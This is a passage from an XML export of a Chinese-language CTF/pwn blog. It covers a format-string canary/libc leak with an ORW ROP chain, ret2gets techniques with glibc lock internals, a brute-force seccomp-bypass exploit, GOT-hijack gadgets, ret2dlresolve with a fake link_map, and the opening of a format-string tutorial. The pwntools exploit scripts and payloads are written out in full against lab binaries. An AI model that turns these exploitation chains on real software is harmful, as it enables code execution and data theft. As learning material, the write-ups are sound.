0x&#123;canary_hex.decode()&#125;&quot;)p.recvuntil(b&quot;--&gt;&gt;&quot;)p.sendline(str(1))p.recvuntil(b&quot;i can keep it a secret for you.&quot;)p.sendline(decrypt_data(b&quot;y&quot;,1))p.recvuntil(b&quot;What do you want to say?&quot;)payload10=b&quot;%33$p&quot;p.sendline(decrypt_data(payload10,5))p.recvuntil(b&quot;You said: &quot;)p.recvuntil(b&quot;0x&quot;)canary_hex = p.recv(12)libc_base = int(canary_hex, 16)-libc.sym[&quot;__libc_start_main&quot;]-0x80print(hex(libc_base))open_plt_addr = libc_base + libc.sym[&quot;open&quot;]read_plt_addr = libc_base + libc.sym[&quot;read&quot;]write_plt_addr = libc_base + libc.sym[&quot;write&quot;]pop_rdi_addr=libc_base+0x2a3e5pop_rsi_addr=libc_base+0x2be51pop_rdx_addr=libc_base+0x11f357pop_rdx_addr_1=libc_base+0xa5722write_addr=text_base+0x4600read_ret=text_base+0x1b32leave_ret=text_base+0x1b5dp.recvuntil(b&quot;--&gt;&gt;&quot;)p.sendline(str(4))p.recvuntil(b&quot;Tell me something to prove that your girlfrined exists.&quot;)payload2=p64(0)*9+p64(canary)+p64(write_addr)+p64(read_ret)p.send(payload2)pause()payload3 = p64(write_addr-0x100)payload3+= p64(pop_rdi_addr)payload3+= p64(write_addr-0x10)payload3+= p64(pop_rsi_addr)payload3+= p64(0)payload3+= p64(open_plt_addr)payload3+= p64(read_ret)payload3+= p64(pop_rdi_addr+1)payload3+= b&quot;/flag\x00\x00\x00&quot;payload3+= p64(canary)payload3+= p64(write_addr-0x50)payload3+= p64(leave_ret)p.send(payload3)pause()payload4 = p64(write_addr-0x200)payload4+= p64(pop_rdi_addr)payload4+= p64(3)payload4+= p64(pop_rsi_addr)payload4+= p64(write_addr+0x100)payload4+= p64(read_plt_addr)payload4+= p64(read_ret)payload4+= p64(0)*2payload4+= p64(canary)payload4+= p64(write_addr-0x150)payload4+= p64(leave_ret)p.send(payload4)pause()payload5 = p64(write_addr-0x300)payload5+= p64(pop_rdi_addr)payload5+= p64(1)payload5+= p64(pop_rsi_addr)payload5+= p64(write_addr+0x100)payload5+= p64(pop_rdx_addr)payload5+= p64(0x100)payload5+= p64(0)payload5+= p64(write_plt_addr)payload5+= p64(canary)payload5+= p64(write_addr-0x250)payload5+= p64(leave_ret)p.send(payload5)p.interactive()
]]></content>
      <categories>
        <category>Competiton</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>StackSkill</title>
    <url>/2025/12/12/StackSkill/</url>
    <content><![CDATA[ret2gets
适用于高版本，很强大无gadget的利用利用方式
#include &lt;stdio.h&gt;int main()&#123;    char buf[0x20];    puts(&quot;Show how to ret2gets!&quot;);    gets(buf);    return;&#125;//gcc -g ret2gets.c -o ret2gets -no-pie -fno-stack-protector
事实上，再执行完gets后，rdi会指向libc中的一个可写地址，叫_IO_stdfile_0_lock
 RDI  0x7ffc7f51f070 ◂— 0  ► 0x40117d &lt;main+39&gt;    call   gets@plt                    &lt;gets@plt&gt;        rdi: 0x7ffc7f51f070 ◂— 0        rsi: 0x890a2a0 ◂— &#x27;Show how to ret2gets!\n&#x27;        rdx: 0        rcx: 0x78826931c5a4 (write+20) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */        --------------------------------------------------------------------------------------*RDI  0x788269405720 (_IO_stdfile_0_lock) ◂— 0pwndbg&gt; vmmap 0x788269405720LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)    0x788269403000     0x788269405000 rw-p     2000  202000 ...►   0x788269405000     0x788269412000 rw-p     d000       0 [anon_788269405] +0x720    0x788269591000     0x788269596000 rw-p     5000       0 [anon_788269591]
类似的puts后rdi也会指向_IO_stdfile_1_lock
pwndbg&gt; tele 0x78826940570000:0000│     0x788269405700 (_IO_stdfile_2_lock) ◂— 001:0008│     0x788269405708 (_IO_stdfile_2_lock+8) ◂— 000:0010│     0x788269405710 (_IO_stdfile_1_lock) ◂— 001:0018│     0x788269405718 (_IO_stdfile_1_lock+8) ◂— 000:0020│ rdi 0x788269405720 (_IO_stdfile_0_lock) ◂— 001:0028│     0x788269405728 (_IO_stdfile_0_lock+8) ◂— 0
对于gets函数
char *_IO_gets (char *buf)&#123;  size_t count;  int ch;  char *retval;  _IO_acquire_lock (stdin);  ch = _IO_getc_unlocked (stdin);  if (ch == EOF)    &#123;      retval = NULL;      goto unlock_return;    &#125;  if (ch == &#x27;\n&#x27;)    count = 0;  else    &#123;      int old_error = stdin-&gt;_flags &amp; _IO_ERR_SEEN;      stdin-&gt;_flags &amp;= ~_IO_ERR_SEEN;      buf[0] = (char) ch;      count = _IO_getline (stdin, buf + 1, INT_MAX, &#x27;\n&#x27;, 0) + 1;      if (stdin-&gt;_flags &amp; _IO_ERR_SEEN)	&#123;	  retval = NULL;	  goto unlock_return;	&#125;      else	stdin-&gt;_flags |= old_error;    &#125;  buf[count] = 0;  retval = buf;unlock_return:  _IO_release_lock (stdin);  return retval;&#125;
这个结构是一个锁对象，通过控制他的值来应对条件竞争漏洞
gets函数的开头，获取了锁，告知其他线程stdin正在使用 gets函数的结尾，释放了锁，告知其他线程stdin已可用结束
而这个结构体
typedef struct &#123;    int lock;    int cnt;    void *owner;&#125; _IO_lock_t;
IO_FILE结构体的0x88  _lock结构体指向它
11:0088│     0x788269403968 (_IO_2_1_stdin_+136) —▸ 0x788269405720 (_IO_stdfile_0_lock) ◂— 0
再来看这个函数
# ifdef __EXCEPTIONS#  define _IO_acquire_lock(_fp) \  do &#123;									      \    FILE *_IO_acquire_lock_file						      \	__attribute__((cleanup (_IO_acquire_lock_fct)))			      \	= (_fp);							      \    _IO_flockfile (_IO_acquire_lock_file);# else#  define _IO_acquire_lock(_fp) _IO_acquire_lock_needs_exceptions_enabled# endif# define _IO_release_lock(_fp) ; &#125; while (0)#endif
调用了_IO_acquire_lock_fct
static inline void__attribute__ ((__always_inline__))_IO_acquire_lock_fct (FILE **p)&#123;  FILE *fp = *p;  if ((fp-&gt;_flags &amp; _IO_USER_LOCK) == 0)    _IO_funlockfile (fp);&#125;
所以主要的是两个函数
# define _IO_flockfile(_fp) \  if (((_fp)-&gt;_flags &amp; _IO_USER_LOCK) == 0) _IO_lock_lock (*(_fp)-&gt;_lock)# define _IO_funlockfile(_fp) \  if (((_fp)-&gt;_flags &amp; _IO_USER_LOCK) == 0) _IO_lock_unlock (*(_fp)-&gt;_lock)
其中的两个函数
#define _IO_lock_lock(_name) \  do &#123;									      \    void *__self = THREAD_SELF;						      \    if (SINGLE_THREAD_P &amp;&amp; (_name).owner == NULL)			      \      &#123;									      \	(_name).lock = LLL_LOCK_INITIALIZER_LOCKED;			      \	(_name).owner = __self;						      \      &#125;									      \    else if ((_name).owner != __self)					      \      &#123;									      \	lll_lock ((_name).lock, LLL_PRIVATE);				      \	(_name).owner = __self;						      \      &#125;									      \    else								      \      ++(_name).cnt;							      \  &#125; while (0)#define _IO_lock_unlock(_name) \  do &#123;									      \    if (SINGLE_THREAD_P &amp;&amp; (_name).cnt == 0)				      \      &#123;									      \	(_name).owner = NULL;						      \	(_name).lock = 0;						      \      &#125;									      \    else if ((_name).cnt == 0)						      \      &#123;									      \	(_name).owner = NULL;						      \	lll_unlock ((_name).lock, LLL_PRIVATE);				      \      &#125;									      \    else								      \      --(_name).cnt;							      \  &#125; while (0)
这里面cnt存在整数溢出漏洞
对于有后门函数的函数
形如ret2system
payload1=b&quot;a&quot;*0x20+p64(rbp)+p64(gets_plt)p.sendline(payload1)payload2=b&quot;/bin&quot;+p8(u8(b&quot;/&quot;)+1)+b&quot;ah&quot;p.sendline(payload2)
又或者是leak libc
如果有printf
可以在结构中写入
p.sendline(b&quot;%69$&quot;+p8(u8(b&quot;p&quot;)+1))
如果有puts

在2.37以前

offset=fs_base-libc_basepayload1=b&quot;a&quot;*0x20+p64(rbp)+p64(gets_plt)+p64(puts_plt)p.sendline(payload1)payload2=b&quot;a&quot;*4+b&quot;\x00&quot;*3p.sendline(payload2)p.recv(8)libc_base=u64(p.recv(6)+b&quot;\x00\x00&quot;)-offset

通用

offset=fs_base-libc_basepayload1=b&quot;a&quot;*0x20+p64(rbp)+p64(gets_plt)+p64(gets_plt)+p64(puts_plt)p.sendline(payload1)payload2=p32(0)+b&quot;a&quot;*4+b&quot;b&quot;*8p.sendline(payload2)payload3=b&quot;c&quot;*4p.sendline(payload3)p.recv(8)libc_base=u64(p.recv(6)+b&quot;\x00\x00&quot;)-offset
当gets后不是直接返回而是使用了其他的函数改变了rdi，比如puts函数
#include &lt;stdio.h&gt;int main() &#123;	char buf[0x20];	puts(&quot;ROP me if you can!&quot;);	gets(buf);	puts(&quot;No lock for you ;)&quot;);&#125;
有以下几种情况：
rdi writable
再次调用gets
rdi readable
调用puts，使其可写在调用gets
rdi=NULL
ret2printf
调用printf(NULL)会在rdi留下_IO_2_1_stdout_的地址
ret2fflush
调用fflush(NULL)会在rdi留下一个栈指针指向funlockfile（中间调用了__libc_cleanup_pop_restore(&amp;_buffer)）
这在2.37发生了改变
rdi=junk
ret2rand
调用rand后会在rdi存下一个libc地址
因此可以联合利用，但是联合于ret2gets只能在2.27以前才行？
addr = libc.sym.__fork_handlersdata = p64(addr+8) + forge_packed(addr+8, libc.sym.rand, libc.sym.gets, libc.sym.rand, libc.sym.system)assert b&quot;\n&quot; not in dataextra_data = flat(&#123;    0x00: b&quot;/bin/sh\x00&quot;,    0x10: libc.sym.randtbl+4,    # the previous `state` field    0x18: p32(0),   # TYPE_0&#125;)assert b&quot;\n&quot; not in extra_datap.sendlineafter(b&quot;Enter address, size and data: &quot;, f&quot;&#123;addr&#125; &#123;len(data)+2&#125; &quot;.encode() + data)p.sendline(extra_data)p.interactive()
抑或是使用setcontext
addr = libc.sym.__fork_handlersdata = p64(addr+8) + forge_packed(addr+8, libc.sym.rand, libc.sym.gets, libc.sym.rand, libc.sym.setcontext)assert b&quot;\n&quot; not in dataucontext = setcontext(&#123;    &quot;rdi&quot;: next(libc.search(b&quot;/bin/sh\x00&quot;)),    &quot;rsi&quot;: 0,    &quot;rdx&quot;: 0,    &quot;rip&quot;: libc.sym.execve,    &quot;rsp&quot;: libc.sym.unsafe_state+0x200&#125;, libc.sym.unsafe_state)extra_data = flat(&#123;    0x10: libc.sym.randtbl+4,    0x18: p32(0),   # TYPE_0&#125;)extra_data += ucontext[len(extra_data):]assert b&quot;\n&quot; not in extra_datap.sendlineafter(b&quot;Enter address, size and data: &quot;, f&quot;&#123;addr&#125; &#123;len(data)+2&#125; &quot;.encode() + data)p.sendline(extra_data)p.interactive()
ret2getchar/ret2putchar
待补充
我写了一个程序
#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/resource.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;seccomp.h&gt;#include &lt;errno.h&gt;int set_seccomp_rules() &#123;    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_ALLOW);    if (ctx == NULL) &#123;        perror(&quot;seccomp_init failed&quot;);        return -1;    &#125;    const int forbidden_syscalls[] = &#123;        SCMP_SYS(execve),        SCMP_SYS(execveat)    &#125;;    for (int i = 0; i &lt; sizeof(forbidden_syscalls) / sizeof(int); i++) &#123;        if (seccomp_rule_add(ctx, SCMP_ACT_KILL, forbidden_syscalls[i], 0) == -1) &#123;            perror(&quot;seccomp_rule_add failed&quot;);            seccomp_release(ctx);            return -1;        &#125;    &#125;    if (seccomp_load(ctx) == -1) &#123;        perror(&quot;seccomp_load failed&quot;);        seccomp_release(ctx);        return -1;    &#125;    seccomp_release(ctx);    return 0;&#125;void sandbox_init() &#123;    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1) &#123;        perror(&quot;prctl PR_SET_NO_NEW_PRIVS failed&quot;);        exit(1);    &#125;    if (set_seccomp_rules() == -1) &#123;        exit(1);    &#125;&#125;int main()&#123;    sandbox_init();    char buf[0x20];    puts(&quot;Welcome to ROP-master!&quot;);    gets(buf);    return 0;&#125;#gcc -g -o ret2gets ./ret2gets.c -no-pie -fno-stack-protector -lseccomp #glibc 2.41-6ubuntu1
由于tls结构体和libc的偏移存在不确定，所以只能爆破处理，有三位数字可能不同
data_recv=b&quot;0&quot;def boom():    gets_plt=0x401120    puts_plt=0x4010e0    offset=0x330740    bss=0x404800    p.recvuntil(b&quot;Welcome to ROP-master!&quot;)    payload1=b&quot;a&quot;*0x20+p64(bss)+p64(gets_plt)+p64(gets_plt)+p64(puts_plt)+p64(0x4013AF)    p.sendline(payload1)    payload2=p32(0)+b&quot;a&quot;*4+b&quot;b&quot;*8    p.sendline(payload2)    payload3=b&quot;c&quot;*4    p.sendline(payload3)    p.recv(1)    a=p.recv(8)    libc_base=u64(p.recv(6)+b&quot;\x00\x00&quot;)-offset    #log.success(hex(libc_base))    open_addr = libc_base + libc.sym[&quot;open&quot;]    read_addr = libc_base + libc.sym[&quot;read&quot;]    write_addr = libc_base + libc.sym[&quot;write&quot;]    pop_rdi_addr=libc_base+ 0x11a79c    pop_rsi_addr=0x11b97d+libc_base    pop_rdx_addr=libc_base+0xb5762    payload4=b&quot;/flag\x00\x00\x00&quot;+b&quot;a&quot;*0x18+p64(bss)+p64(pop_rdi_addr)+p64(bss-0x20)+p64(pop_rsi_addr)+p64(0)+p64(open_addr)    payload4+=p64(pop_rdi_addr)+p64(3)+p64(pop_rsi_addr)+p64(bss-0x400)+p64(pop_rdx_addr)+p64(0x100)+p64(read_addr)    payload4+=p64(pop_rdi_addr)+p64(1)+p64(pop_rsi_addr)+p64(bss-0x400)+p64(write_addr)    p.sendline(payload4)    data_recv=p.recvline()    log.success(data_recv)    for i in range(1024):    try:        p=start()        boom()        #log.success(i)        dataa=p.recvline()        log.success(data_recv)        data_stripped = data_recv.strip()        if(data_stripped==b&quot;your_flag_content&quot;):            break        sleep(0.1)        p.close()    except:        #log.success(b&quot;trying&quot;)        #log.success(i)        p.close()        continuep.interactive()
no leak got hijack
使用一些gadget达到攻击的效果
0x00000000004010bf : add bl, al ; ... ; ret0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret0x000000000040115d : pop rbp ; ret
设置rbp使rbp-0x3d指向got，使用add改变got表中的值
只需要控制ebx
通过add先行改变setbuf的got指向setbuf（+0x80）
而setbuf中存在pop rbx
ret2dlresolve
got表是Global Offset Table的简称
plt表是Procedure Linkage Table的简称
它们都是重定向relocations的实现方式，是为了给外部变量和函数提供调用的方法
而函数和变量作为符号被存在可执行文件中，不同类型符号聚合在一起，称为符号表，有两种类型
一种是常规的.symtab和.strtab，一种是动态的.dynsym和.dynstr
在没有开Full RELOC时第一次调用函数时 
第二次调用函数时 
过程分析
在调用_dl_runtime_resolve前先push了一个序号，在push了个地址，这个地址就是link_map
关键的函数是
_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif	   struct link_map *l, ElfW(Word) reloc_arg)&#123;  const ElfW(Sym) *const symtab    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);  const PLTREL *const reloc    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  const ElfW(Sym) *refsym = sym;  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);  lookup_t result;  DL_FIXUP_VALUE_TYPE value;  /* Sanity check that we&#x27;re really looking at a PLT relocation.  */  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);   /* Look up the target symbol.  If the normal lookup rules are not      used don&#x27;t look in the global scope.  */  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)    &#123;      const struct r_found_version *version = NULL;      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)	&#123;	  const ElfW(Half) *vernum =	    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;	  version = &amp;l-&gt;l_versions[ndx];	  if (version-&gt;hash == 0)	    version = NULL;	&#125;      /* We need to keep the scope around so do some locking.  This is	 not necessary for objects which cannot be unloaded or when	 we are not using any threads (yet).  */      int flags = DL_LOOKUP_ADD_DEPENDENCY;      if (!RTLD_SINGLE_THREAD_P)	&#123;	  THREAD_GSCOPE_SET_FLAG ();	  flags |= DL_LOOKUP_GSCOPE_LOCK;	&#125;#ifdef RTLD_ENABLE_FOREIGN_CALL      RTLD_ENABLE_FOREIGN_CALL;#endif      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);      /* We are done with the global scope.  */      if (!RTLD_SINGLE_THREAD_P)	THREAD_GSCOPE_RESET_FLAG ();#ifdef RTLD_FINALIZE_FOREIGN_CALL      RTLD_FINALIZE_FOREIGN_CALL;#endif      /* Currently result contains the base load address (or link map)	 of the object that defines sym.  Now add in the symbol	 offset.  */      value = DL_FIXUP_MAKE_VALUE (result,				   sym ? (LOOKUP_VALUE_ADDRESS (result)					  + sym-&gt;st_value) : 0);    &#125;  else    &#123;      /* We already found the symbol.  The module (and therefore its load	 address) is also known.  */      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);      result = l;    &#125;  /* And now perhaps the relocation addend.  */  value = elf_machine_plt_value (l, reloc, value);  if (sym != NULL      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  /* Finally, fix up the plt itself.  */  if (__glibc_unlikely (GLRO(dl_bind_not)))    return value;  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);&#125;
一步一步分析这个函数做了什么
_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif	   struct link_map *l, ElfW(Word) reloc_arg)
看看传入的参数，与我们push的两个参数一样

l 是调用者所在的 link_map，记录该动态库或可执行文件的加载信息
reloc_arg 是重定位槽编号（PLT entry 编号），用于查找具体哪个函数需要绑定

link_map的结构：
struct link_map&#123;  ElfW(Addr) l_addr;   // 当前对象在内存中实际加载地址与它的ELF文件中指定地址的差值（即重定位偏移）  char *l_name;        // 当前共享对象的文件名（绝对路径）  ElfW(Dyn) *l_ld;     // 指向该对象的动态段（.dynamic section），里面包含了所有动态链接的信息  struct link_map *l_next, *l_prev; // 链表指针，指向加载链中的前一个和下一个 link_map&#125;;
而又有
#define ElfW(type)        _ElfW (Elf, __ELF_NATIVE_CLASS, type)#define _ElfW(e,w,t)      _ElfW_1 (e, w, _##t)#define _ElfW_1(e,w,t)    e##w##t
再看变量 __ELF_NATIVE_CLASS 的含义：

在 32 位系统上为 32
在 64 位系统上为 64

其中type有以下类型



类型
展开结果




ElfW(Addr)
Elf32(64)_Addr


ElfW(Sym)
Elf64_Sym


ElfW(Dyn)
Elf64_Dyn


ElfW(Half)
Elf64_Half



也就是说ElfW(Addr)=Elf64_Addr,ElfW(Dyn)=Elf64_Dyn这样
而
typedef uint64_t Elf64_Addr;typedef struct&#123;    Elf64_Sxword d_tag;       /* Dynamic entry type */    union&#123;        Elf64_Xword d_val;    /* Integer value */        Elf64_Addr d_ptr;     /* Address value */    &#125; d_un;&#125; Elf64_Dyn;
1. 获取符号表与字符串表
const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
2. 获取当前重定位项
const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);

DT_JMPREL：保存 .rel.plt 表的位置
reloc_offset 是根据 reloc_arg 算出来的
reloc：指向当前 PLT 的重定位项

3. 获取符号项和地址
const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);

reloc-&gt;r_info 里面编码了符号索引
sym 是要绑定的符号（比如 printf）
rel_addr 是 GOT 中的地址，即我们需要写入“真正函数地址”的地方

4. 断言：必须是 PLT 重定位
assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);

只处理 JMP_SLOT 类型（即跳转槽），其他如 RELATIVE 等不由 _dl_fixup 处理

5. 判断符号是否可见并查找真实地址
if (ELFW(ST_VISIBILITY) (sym-&gt;st_other) == 0)

如果符号是默认可见（即不是 hidden），则进行全局符号查找：

result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);

查找流程包括版本信息、作用域锁等
result 是找到该符号所在的 link_map
sym-&gt;st_value 是符号在该库内的偏移，加上 result 的基地址就是最终地址

6. 查询出具体函数的地址
#define DL_FIXUP_MAKE_VALUE(map, addr) (addr)#define LOOKUP_VALUE_ADDRESS(map) ((map) ? (map)-&gt;l_addr : 0)/* Currently result contains the base load address (or link map)	 of the object that defines sym.  Now add in the symbol	 offset.  */      value = DL_FIXUP_MAKE_VALUE (result,				   sym ? (LOOKUP_VALUE_ADDRESS (result)					  + sym-&gt;st_value) : 0);
如果 sym 存在，就计算：
value = l_addr + sym-&gt;st_value;
这里的l_addr是libc在库中的偏移，也就是说这个是libc_base，那么value也就是：符号的真实内存地址
否则：
value = DL_FIXUP_MAKE_VALUE(result, 0);
即符号未找到，回传 0
7. 修正值：考虑架构的特殊处理
#define elf_machine_plt_value(map, reloc, value) (value)value = elf_machine_plt_value (l, reloc, value);

某些架构需要对地址进行调整（如加偏移、修正格式）；

8. IFUNC 处理（间接函数）
if (sym &amp;&amp; STT_GNU_IFUNC) &#123;    value = elf_ifunc_invoke(...);&#125;

如果符号类型是 GNU_IFUNC（间接函数），则先调用解析函数获得真实地址。

9. 写回 GOT 表（用于后续直接跳转）
if (__glibc_unlikely (GLRO(dl_bind_not)))    return value;return elf_machine_fixup_plt(l, result, refsym, sym, reloc, rel_addr, value);elf_machine_fixup_plt (struct link_map *map, lookup_t t,		       const ElfW(Sym) *refsym, const ElfW(Sym) *sym,		       const ElfW(Rela) *reloc,		       ElfW(Addr) *reloc_addr, ElfW(Addr) value)&#123;  return *reloc_addr = value;&#125;

dl_bind_not 表示是否跳过写回（某些情况会保留懒绑定）；
否则会调用 elf_machine_fixup_plt() 把 value 写入 GOT 中的 rel_addr，完成绑定；
返回 value 给调用方继续执行

解题手法
适用于没有 libc 泄露或 info leak的情况，但有栈溢出、有任意可控内存写、可控寄存器，且已知 plt, got, rel.plt 等节区偏移
我们的link_map是这样的
struct link_map &#123;    Elf64_Addr l_addr;    char *l_name;    Elf64_Dyn *l_ld;    struct link_map *l_next;    struct link_map *l_prev;    struct link_map *l_real;    Lmid_t l_ns;    struct libname_list *l_libname;    Elf64_Dyn *l_info[76];  //l_info 里面包含的就是动态链接的各个表的信息    ...    size_t l_tls_firstbyte_offset;    ptrdiff_t l_tls_offset;    size_t l_tls_modid;    size_t l_tls_dtor_count;    Elf64_Addr l_relro_addr;    size_t l_relro_size;    unsigned long long l_serial;    struct auditstate l_audit[];&#125;
No RELRO-64
在DYNAMIC节中就存着DT_STRTAB和DT_SYMTAB，分别指向字符名表和符号表。而这个DYNAMIC节在No RELRO情况下是可写的。那么利用思路就很明确了，可以直接rop链调用read读取内容覆盖DT_STRTAB为一个我们可控的地址，然后我们自己在该地址处伪造一个字符表，把目标函数的字符串换成system，最后直接返回到该函数plt表第二个jmp前的push处压id调用**_dl_runtime_resolve**即可
PARTIAL RELRO
在PARTIAL RELRO下dynamic节不可直接改写

exp
def build_fake_link_map(fake_linkmap_addr,func,base_func=&#x27;puts&#x27;):    # &amp;(2**64-1)是因为offset为负数，如果不控制范围，p64后会越界，发生错误    offset = n64(libc.sym[func] - libc.sym[base_func])    # linkmap = p64(offset &amp; (2 ** 64 - 1))#l_addr    linkmap = p64(offset)    # fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容    linkmap += p64(0) # 可以为任意值    linkmap += p64(fake_linkmap_addr + 0x18) # 这里的值就是伪造的.rel.plt的地址    # fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项    # linkmap += p64((fake_linkmap_addr + 0x30 - offset) &amp; (2 ** 64 - 1)) # Rela-&gt;r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可     linkmap += p64(n64(elf.bss()-offset))    linkmap += p64(0x7) # Rela-&gt;r_info,用于索引symtab上的对应项，7&gt;&gt;32=0，也就是指向symtab的第一项    linkmap += p64(0)# Rela-&gt;r_addend,任意值都行    linkmap += p64(0)#l_ns    # fake_linkmap_addr + 0x38, DT_SYMTAB     linkmap += p64(0) # 参考IDA上.dyamisc的结构    linkmap += p64(elf.got[base_func] - 0x8) # 这里的值就是伪造的symtab的地址,为已解析函数的got表地址-0x8    linkmap += b&#x27;/bin/sh\x00&#x27;    linkmap = linkmap.ljust(0x68,b&#x27;A&#x27;)    linkmap += p64(elf.bss()+0x100) # fake_linkmap_addr + 0x68, 对应的值的是DT_STRTAB的地址，由于我们用不到strtab，所以随意设置了一个可读区域    linkmap += p64(fake_linkmap_addr + 0x38) # fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址    linkmap = linkmap.ljust(0xf8,b&#x27;A&#x27;)    linkmap += p64(fake_linkmap_addr + 0x8) # fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址    return linkmapread_plt = elf.plt[&#x27;read&#x27;]  fake_linkmap_addr = elf.bss() + 0x100 fake_link_map = build_fake_link_map(fake_linkmap_addr, &#x27;system&#x27; ,&#x27;write&#x27;)# 伪造link_mappadding=120payload = cyclic(padding)payload += flat(&#123;    0x00:next(elf.search(asm(&#x27;ret&#x27;), executable=True)),    0x08:next(elf.search(asm(&#x27;pop rdi; ret&#x27;), executable=True)),    0x10:0,    0x18:next(elf.search(asm(&#x27;pop rsi; pop r15; ret&#x27;), executable=True)),    0x20:fake_linkmap_addr,    0x28:0,    0x30:elf.plt[&#x27;read&#x27;],    0x38:next(elf.search(asm(&#x27;pop rdi; ret&#x27;), executable=True)),    0x40:fake_linkmap_addr + 0x48,    0x48:elf.get_section_by_name(&#x27;.plt&#x27;).header.sh_addr + 6,    0x50:fake_linkmap_addr,# struct link_map *l    0x58:0 # ElfW(Word) reloc_arg&#125;)ru(b&#x27;Welcome to XDCTF2015~!\n&#x27;)  sl(payload)pause()s(fake_link_map) 
参考
https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets#leaking-libc
ret2gets 一种控制rdi的攻击方法-CSDN博客
深入了解GOT,PLT和动态链接 - 有价值炮灰 - 博客园
https://xz.aliyun.com/news/17612
https://r3t2.top/2025/09/10/%E5%85%B3%E4%BA%8Eret2dlresolve/
深入理解ret2dlresolve | Collectcrop’s Blog
]]></content>
      <categories>
        <category>Knowledge</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞利用</title>
    <url>/2025/11/14/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[虽然目前几乎不会出现格式化字符串漏洞，但是不可否认格式化字符串漏洞是一种威力强大的漏洞利用方式，可以实现任意地址写和任意地址读，达到数据泄露、程序崩溃甚至劫持程序流的严重后果。下面来了解一下格式化字符串漏洞的利用，先了解一下什么函数什么形式可以导致格式化字符串漏洞。先声明调试环境是wsl2虚拟机，x86_64，Ubuntu 24.04。
格式化字符串函数

输入

scanf

输出




函数
基本介绍




printf
输出到 stdout


fprintf
输出到指定 FILE 流


vprintf
根据参数列表格式化输出到 stdout


vfprintf
根据参数列表格式化输出到指定 FILE 流


sprintf
输出到字符串


snprintf
输出指定字节数到字符串


vsprintf
根据参数列表格式化输出到字符串


vsnprintf
根据参数列表格式化输出指定字节到字符串


setproctitle
设置 argv


syslog
输出日志


err, verr, warn, vwarn 等
。。。



格式化字符串的格式
这里我们了解一下格式化字符串的格式，其基本格式如下
%[parameter][flags][field width][.precision][length]type

parameter

n$，获取格式化字符串中的指定参数

flags
field width

输出的最小宽度

precision

输出的最大精度

length

hh：输出一个字节
h：输出一个双字节

type：

下面列举一下格式化字符串漏洞常用的type，其他的就省略了



转义符
功能




%d
以十进制形式输出整数


%u
以十进制形式输出无符号整数


%x
以十六进制形式输出整数（小写字母）


%c
输出单个字符


%s
输出字符串


%p
输出指针的地址


%n
将已经输出的字符数写入参数



我们以printf为举例，在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况

当前字符不是 %，直接输出到相应标准输出。
当前字符是 %， 继续读取下一个字符

如果没有字符，报错
如果下一个字符是 %, 输出 %
否则根据相应的字符，获取相应的参数，对其进行解析并输出


形如printf(buf)是最常见的格式化字符串漏洞
栈上的利用
对于占位符数量与参数数量不相等的情况
